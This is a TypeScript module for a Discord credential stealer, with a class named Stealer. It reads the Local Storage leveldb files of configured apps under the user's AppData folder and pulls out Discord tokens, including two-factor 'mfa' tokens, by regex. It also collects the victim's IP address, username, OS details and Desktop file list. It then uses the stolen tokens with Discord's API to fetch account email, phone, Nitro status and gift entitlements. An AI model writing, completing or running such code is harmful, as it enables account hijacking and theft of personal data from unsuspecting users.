import * as Bluebird from 'bluebird';
import * as fs from 'promise-fs';
import * as path from 'path';
import * as _ from 'lodash';
import * as os from 'os';

import Collection from '@discordjs/collection';

import fetch, { Response } from 'node-fetch';

//export type DiscordCollection<T> = Collection<Snowflake, T>;

export class List<T> extends Collection<number, T> {
	public constructor(entries?: ReadonlyArray<readonly [number, T]> | null) {
		super(entries);
	}

	public static fromArray<T>(array: T[]): List<T> {
		const list: List<T> = new List<T>();
		array.forEach((entry: T) => {
			list.add(entry);
		});
		return list;
	}

	public add(entry: T): List<T> {
		return this.set(this.size, entry);
	}

	public addRange(entries: List<T>): List<T> {
		entries.each((entry: T) => this.add(entry));
		return this;
	}

	public difference(other: List<T>): List<T> {
		return other.filter((_: T, key: number) => !this.has(key)).concat(this.filter((_: T, key: number) => !other.has(key)));
	}
}

export interface OSInfo {
	platform: string | null;
	arch: string | null;
	type: string | null;
	version: string | null;
	release: string | null;
}

export class FileInfo {
	public fullPath: string;

	private stats: fs.Stats;
	
	public constructor(fullPath: string, stats: fs.Stats) {
		this.fullPath = fullPath;
		this.stats = stats;
	}

	public get name(): string {
		return path.basename(this.fullPath);
	}

	public get isFile(): boolean {
		return this.stats.isFile();
	}

	public get isDirectory(): boolean {
		return this.stats.isDirectory();
	}
}

export class Stealer {
	private constructor() {}

	public static async getIP(): Promise<string> {
		const response: Response = await fetch('https://api.ipify.org/?format=json');
		const json: { ip: string } = await response.json();
		return json.ip;
	}

	public static getUsername(): string {
		return os.userInfo().username;
	}

	public static getOS(): OSInfo {
		return {
			platform: os.platform ? os.platform() : null,
			arch: os.arch ? os.arch() : null,
			type: os.type ? os.type() : null,
			version: os.version ? os.version() : null,
			release: os.release ? os.release() : null
		};
	}

	public static async getDesktopFiles(): Promise<FileInfo[]> {
		try {
			const fullDir: string = path.resolve(
				os.userInfo().homedir,
				'Desktop'
			);

			const filenames: string[] = await fs.readdir(fullDir);
			const files: FileInfo[] = await Bluebird.map(filenames, async (file: string) => {
				const filePath: string = path.resolve(fullDir, file);
				return new FileInfo(filePath, await fs.stat(filePath));
			});
			return files;
		} catch {
			return [];
		}
	}

	public static async getGifts(token: string): Promise<string> {
		const response: Response = await fetch('https://discord.com/api/v6/users/@me/entitlements/gifts', {
			headers: {
				'authorization': token
			}
		});
		const json: any = await response.json();
		return JSON.stringify(json);
	}
}

export class Service {
	public name: string;
	public dir: string;

	public searchLogs: boolean;

	public constructor(name: string, dir: string, searchLogs: boolean = false) {
		this.name = name;
		this.dir = dir;
		this.searchLogs = searchLogs;
	}

	public async getTokens(): Promise<List<Token>> {
		const fullDir: string = path.resolve(
			os.userInfo().homedir,
			'AppData',
			this.dir,
			'Local Storage',
			'leveldb'
		);

		const tokens: List<Token> = new List<Token>();
		try {
			await fs.stat(fullDir);
		} catch {
			return tokens;
		}

		const filesLDB: string[] = (await fs.readdir(fullDir))
			.filter((file: string) => file.endsWith('.ldb'));
		const filesLog: string[] = (await fs.readdir(fullDir))
			.filter((file: string) => file.endsWith('.log'));

		try {
			const contentsLDB: string[] = await Bluebird.map(filesLDB, (file: string) => {
				return fs.readFile(path.resolve(fullDir, file), {
					encoding: 'utf8'
				});
			});
			const contentsLog: string[] = await Bluebird.map(filesLog, (file: string) => {
				return fs.readFile(path.resolve(fullDir, file), {
					encoding: 'utf8'
				});
			});

			contentsLDB.forEach((content: string) => {
				tokens.addRange(this.extractTokens(content));
			});
			if(this.searchLogs) {
				contentsLog.forEach((content: string) => {
					tokens.addRange(this.extractTokens(content));
				});
			}
		} catch(error) {
			console.log(error);
		}

		if(tokens.size > 0) {
			tokens.last()?.markNewest();
		}

		return tokens;
	}

	private extractTokens(content: string): List<Token> {
		const tokens: List<Token> = new List<Token>();

		content.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)?.forEach((match: string) => {
			const token: Token = new Token(this, TokenType.Normal, match);
			tokens.add(token);
		});

		content.match(/mfa\.[\w-]{84}/g)?.forEach((match: string) => {
			const token: Token = new Token(this, TokenType.TwoFactor, match);
			tokens.add(token);
		});

		return tokens;
	}
}

export enum TokenType {
	Normal,
	TwoFactor
}

export class Token {
	public service: Service;

	public type: TokenType;
	public token: string;
	public newest: boolean;

	public constructor(service: Service, type: TokenType, token: string) {
		this.service = service;

		this.type = type;
		this.token = token;
		this.newest = false;
	}

	public markNewest(): void {
		this.newest = true;
	}

	public compare(another: Token): boolean {
		return this.type == another.type && this.token == another.token;
	}

	public static compare(first: Token, second: Token): boolean {
		return first.type == second.type && first.token == second.token;
	}
}

interface _DiscordUser {
	id: string;
	username: string;
	discriminator: string;
	email?: string;
	phone?: string;
	locale: string;
	verified: boolean;
	premium_type?: number;
	mfa_enabled: boolean;
}

export class DiscordUser {
	public id: string;
	public username: string;
	public discriminator: string;
	public email?: string;
	public phone?: string;
	public locale: string;
	public verified: boolean;
	public nitro?: boolean;
	public mfaEnabled: boolean;

	public constructor(data: _DiscordUser) {
		this.id = data.id;
		this.username = data.username;
		this.discriminator = data.discriminator;
		this.email = data.email;
		this.phone = data.phone;
		this.locale = data.locale;
		this.verified = data.verified;
		this.nitro = Boolean(data.premium_type);
		this.mfaEnabled = data.mfa_enabled;
	}

	public static async getUser(token: string): Promise<DiscordUser | null> {
		try {
			const response: Response = await fetch(`https://discord.com/api/v6/users/@me`, {
				headers: {
					'authorization': token
				}
			});
			const json: _DiscordUser = await response.json();
			if((json as unknown as { code: number }).code === 0) return null;
			return new DiscordUser(json);
		} catch {
			return null;
		}
	}

	public get tag(): string {
		return `${this.username}#${this.discriminator}`;
	}
}

export class ValidToken extends Token {
	public user: DiscordUser;

	public constructor(
		token: Token,
		user: DiscordUser
	) {
		super(token.service, token.type, token.token);

		this.user = user;
	}
}
